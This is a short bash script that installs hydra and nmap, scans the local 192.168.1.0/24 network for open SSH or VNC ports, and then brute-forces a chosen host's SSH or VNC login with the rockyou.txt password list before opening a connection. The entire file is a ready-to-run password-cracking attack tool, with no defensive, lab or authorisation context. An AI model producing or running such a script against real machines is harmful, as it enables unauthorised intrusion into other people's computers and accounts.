#!/bin/bash
clear
echo 'Starting...'
function run() {
	brew install hydra && brew install nmap
	clear
	read -p "Do you want SSH(22) or VNC(5900). To see all type (ALL): " service

		if [ $service == "ALL" ] 
			then
			sudo nmap -sS 192.168.1.1/24 --open

		elif [ $service == "all" ] 
			then 
				sudo nmap -sS 192.168.1.1/24 --open

		else
			sudo nmap -sS 192.168.1.1/24 -p $service --open
	fi
	echo "To crack VNC(5900) type 'NONE' in the input username"
	read -p "input username: " user
	read -p "input hostname: " host
	
	if [ $user == "NONE" ] 
		
		then
			hydra -P rockyou.txt -t 64 -o output.txt -I vnc://$host
			open vnc://$host
		else
			hydra -l $user -P rockyou.txt -t 64 -o output.txt -I ssh://$host
			open ssh $user@$host
	fi
};
run